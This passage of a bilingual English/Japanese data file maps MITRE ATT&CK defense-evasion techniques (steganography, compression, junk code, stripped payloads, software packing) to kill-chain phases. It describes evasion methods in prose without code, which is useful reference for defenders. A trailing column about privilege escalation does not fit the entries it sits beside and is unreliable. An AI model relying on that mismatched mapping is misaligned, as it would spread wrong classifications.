攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.003,ステガノグラフィ,Steganography,"攻撃者は、隠された情報の検出を防ぐためにステガノグラフィ技術を使用する可能性があります。ステガノグラフィ技術は、画像、オーディオトラック、ビデオクリップ、またはテキストファイルなどのデジタルメディアにデータを隠すために使用できます。

[Duqu](https://attack.mitre.org/software/S0038)は、ステガノグラフィを使用したマルウェアの初期の例でした。被害者のシステムから収集した情報を暗号化し、C2サーバーに画像を抜き出す前に画像内に隠しました。(引用: Wikipedia Duqu)

2017年末までに、ある脅威グループが<code>Invoke-PSImage</code>を使用して[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドを画像ファイル（.png）に隠し、被害者のシステムでコードを実行しました。この特定のケースでは、[PowerShell](https://attack.mitre.org/techniques/T1059/001)コードは別の難読化されたスクリプトをダウンロードして被害者のマシンから情報を収集し、それを攻撃者に送り返しました。(引用: McAfee Malicious Doc Targets Pyeongchang Olympics)","Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.

[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu)

By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.015,圧縮,Compression,"攻撃者は圧縮を使用してペイロードやファイルを難読化する可能性があります。ZIP、gzip、7z、RARなどの圧縮ファイル形式は、複数のファイルをまとめて圧縮およびアーカイブして、ファイルの転送をより簡単かつ高速にすることができます。ファイルの圧縮に加えて、攻撃者はシェルコードを直接圧縮することもあります。例えば、Windowsレジストリキーに保存するためなどです（つまり、[ファイルレスストレージ](https://attack.mitre.org/techniques/T1027/011)）。(引用: Trustwave Pillowmint June 2020)

検出をさらに回避するために、攻撃者は複数のZIPファイルを1つのアーカイブに結合する場合があります。この連結プロセスにより、単一のアーカイブのように見えるアーカイブが作成されますが、実際には埋め込みアーカイブの中央ディレクトリが含まれています。7zipなどの一部のZIPリーダーは、連結されたZIPファイルを識別できず、悪意のあるペイロードの存在を見逃す可能性があります。(引用: Perception Point)

ファイルアーカイブは、電子メールを介して1つの[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)として送信される場合があります。攻撃者は、ユーザーが悪意のあるペイロードと対話し、システムに抽出するように促すために、アーカイブファイルとして悪意のあるペイロードを送信しています（つまり、[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)）。(引用: NTT Security Flagpro new December 2021) ただし、7zipなどの一部のファイル圧縮ツールは、自己解凍アーカイブを作成するために使用できます。攻撃者は、ペイロードの機能を隠し、ユーザーからの複数のアクションを必要とせずに起動するために、自己解凍アーカイブを送信する場合があります。(引用: The Hacker News)

[圧縮](https://attack.mitre.org/techniques/T1027/015)は、圧縮ファイルが暗号化されパスワードで保護されている[暗号化/エンコードされたファイル](https://attack.mitre.org/techniques/T1027/013)と組み合わせて使用される場合があります。","Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation: Trustwave Pillowmint June 2020)

In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.(Citation: Perception Point)

File archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation: NTT Security Flagpro new December 2021) However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.(Citation: The Hacker News)

[Compression](https://attack.mitre.org/techniques/T1027/015) may be used in combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) where compressed files are encrypted and password-protected.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.016,ジャンクコード挿入,Junk Code Insertion,"攻撃者は、マルウェアの機能を難読化するためにジャンクコード/デッドコードを使用する可能性があります。ジャンクコードは、実行されないコード、または実行されてもコードの機能を変えないコードです。ジャンクコードは、アナリストが主要なコードを分析する代わりに機能しないコードをステップ実行する必要があるため、分析をより困難にし、時間のかかるものにします。また、特に[圧縮](https://attack.mitre.org/techniques/T1027/015)や[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)と組み合わせた場合、良性の機能の使用により静的コード分析に依存する検出を妨げる可能性もあります。(引用: ReasonLabs)(引用: ReasonLabs Cyberpedia Junk Code)

No-Operation (NOP) 命令は、x86アセンブリ言語で一般的に使用されるデッドコードの一例です。これらは一般的に0x90オペコードとして使用されます。NOPがマルウェアに追加されると、逆アセンブラはNOP命令を表示し、アナリストがそれらをステップ実行する必要が生じます。(引用: ReasonLabs)

ジャンク/デッドコード挿入の使用は、マルウェアの署名単に変更するのではなく、コードの機能を難読化することを目的としているため、[バイナリパディング](https://attack.mitre.org/techniques/T1027/001)とは異なります。","Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation: ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code)

No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.(Citation: ReasonLabs)

The use of junk / dead code insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001) because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.008,除去済みペイロード,Stripped Payloads,"攻撃者は、シンボル、文字列、およびその他の人間が読める情報を削除することにより、ペイロードの分析を困難にしようとする可能性があります。スクリプトや実行可能ファイルには、開発者がコードの機能を文書化するのに役立つ変数名やその他の文字列が含まれている場合があります。シンボルは、実行可能ペイロードがコンパイルされるときに、オペレーティングシステムの`リンカ`によって作成されることがよくあります。リバースエンジニアは、これらのシンボルや文字列を使用してコードを分析し、ペイロードの機能を特定します。(引用: Mandiant golang stripped binaries explanation)(引用: intezer stripped binaries elf files 2018)

攻撃者は、マルウェア分析をより困難にするために、除去済みペイロードを使用する可能性があります。例えば、コンパイラやその他のツールは、文字列やシンボルを削除または難読化する機能を提供する場合があります。攻撃者はまた、実行専用AppleScript（[AppleScript](https://attack.mitre.org/techniques/T1059/002)のコンパイル済みおよび除去済みバージョン）など、除去済みペイロード形式を使用して、検出と分析を回避しています。人間が読める情報がないため、ペイロードの検出と分析が直接妨げられる可能性があります。(引用: SentinelLabs reversing run-only applescripts 2021)","Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)

Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.002,ソフトウェアパッキング,Software Packing,"攻撃者は、コードを隠蔽するためにソフトウェアパッキングまたは仮想マシンソフトウェア保護を実行する可能性があります。ソフトウェアパッキングは、実行可能ファイルを圧縮または暗号化する方法です。実行可能ファイルをパッキングすると、署名ベースの検出を回避するためにファイル署名が変更されます。ほとんどの解凍技術は、メモリ内で実行可能コードを解凍します。仮想マシンソフトウェア保護は、実行可能ファイルの元のコードを、特別な仮想マシンのみが実行できる特別な形式に変換します。その後、仮想マシンが呼び出されてこのコードを実行します。(引用: ESET FinFisher Jan 2018)

ソフトウェアパッキングを実行するために使用されるユーティリティは、パッカーと呼ばれます。パッカーの例としては、MPRESSやUPXがあります。既知のパッカーのより包括的なリストが利用可能ですが、攻撃者は防御を回避するために、既知のパッカーと同じアーティファクトを残さない独自のパッキング技術を作成する可能性があります。(引用: Awesome Executable Packing)","Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

